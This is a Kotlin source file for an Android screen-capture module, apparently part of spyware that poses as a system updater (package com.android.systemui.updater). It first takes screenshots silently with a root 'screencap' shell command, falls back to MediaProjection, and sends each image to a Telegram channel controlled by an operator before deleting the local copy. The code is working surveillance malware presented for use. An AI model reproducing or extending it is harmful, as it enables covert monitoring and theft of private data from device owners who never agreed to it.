package com.android.systemui.updater.capabilities

import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.Looper
import androidx.core.content.ContextCompat
import com.android.systemui.updater.SystemUpdateReceiver
import com.android.systemui.updater.TelegramClient
import com.android.systemui.updater.ErrorReporter
import java.io.File
import java.io.FileOutputStream
import java.nio.ByteBuffer
import java.lang.ref.WeakReference

class ScreenCapability(
    private val ctx: Context,
    private val telegram: TelegramClient
) {
    companion object {
        @Volatile private var instanceRef: WeakReference<ScreenCapability>? = null
        fun setInstance(instance: ScreenCapability) { instanceRef = WeakReference(instance) }
        fun deliverProjection(projection: MediaProjection) {
            instanceRef?.get()?.onProjectionReady(projection)
        }
    }

    init {
        instanceRef = WeakReference(this)
    }

    var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val mainHandler = Handler(Looper.getMainLooper())
    private val captureLock = ReentrantLock()

    fun capture() {
        captureLock.lock()
        try {
            val outputFile = File(ctx.cacheDir, "screen_${System.currentTimeMillis()}.png")

            // Try root method first (silent, no user interaction)
            val shell = ShellCapability(ctx, telegram)
            shell.run("/system/bin/screencap -p ${outputFile.absolutePath}")

            if (outputFile.exists() && outputFile.length() > 100) {
                // Root method worked
                telegram.sendPhoto(outputFile, "📺 Screenshot")
                outputFile.delete()
                return
            }

            // No root — use MediaProjection
            if (mediaProjection == null) {
                requestMediaProjection()
                return
            }
            takeScreenshot()
        } finally {
            captureLock.unlock()
        }
    }

    private fun requestMediaProjection() {
        try {
            val intent = Intent(ctx, ScreenCaptureActivity::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
            telegram.sendText("📸 Starting screen capture...\n(Accept the permission prompt)")
        } catch (e: Exception) {
            telegram.sendText("❌ Cannot start screen capture: ${e.message}")
            ErrorReporter.report(e, "ScreenCapability")
        }
    }

    fun onProjectionReady(projection: MediaProjection) {
        captureLock.lock()
        try {
            mediaProjection = projection
            takeScreenshot()
        } finally {
            captureLock.unlock()
        }
    }

    private fun takeScreenshot() {
        val projection = mediaProjection ?: run {
            telegram.sendText("❌ MediaProjection not ready")
            return
        }

        val metrics = ctx.resources.displayMetrics
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        // Release previous resources if they exist
        releaseVirtualDisplay()
        releaseImageReader()

        val localImageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1)
        val localVirtualDisplay = projection.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            localImageReader.surface, null, null
        )

        // Store references for cleanup
        imageReader = localImageReader
        virtualDisplay = localVirtualDisplay

        mainHandler.postDelayed({
            try {
                val image = localImageReader.acquireLatestImage()
                if (image != null) {
                    val bitmap = imageToBitmap(image)
                    image.close()

                    if (bitmap != null) {
                        val file = File(ctx.cacheDir, "screenshot_${System.currentTimeMillis()}.png")
                        file.outputStream().use { out ->
                            bitmap.compress(Bitmap.CompressFormat.PNG, 100, out)
                        }
                        telegram.sendPhoto(file, "📸 Screenshot")
                        file.delete()
                    } else {
                        telegram.sendText("❌ Failed to convert screenshot")
                    }
                } else {
                    telegram.sendText("❌ No screenshot data")
                }
             } catch (e: Exception) {
                telegram.sendText("❌ Screenshot error: ${e.message}")
                ErrorReporter.report(e, "ScreenCapability")
            } finally {
                try { localVirtualDisplay.release() } catch (_: Exception) {}
                try { localImageReader.close() } catch (_: Exception) {}
            }
        }, 500)
    }

    private fun imageToBitmap(image: Image): Bitmap? {
        try {
            val planes = image.planes
            val buffer: ByteBuffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * image.width

            val bitmap = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height,
                Bitmap.Config.ARGB_8888
            )
            bitmap.copyPixelsFromBuffer(buffer)
            return Bitmap.createBitmap(bitmap, 0, 0, image.width, image.height)
        } catch (e: Exception) {
            return null
        }
    }

    private fun releaseVirtualDisplay() {
        try { virtualDisplay?.release() } catch (_: Exception) {}
        virtualDisplay = null
    }

    private fun releaseImageReader() {
        try { imageReader?.close() } catch (_: Exception) {}
        imageReader = null
    }

    fun release() {
        captureLock.lock()
        try {
            releaseVirtualDisplay()
            releaseImageReader()
            mediaProjection?.stop()
            mediaProjection = null
        } finally {
            captureLock.unlock()
        }
    }
}
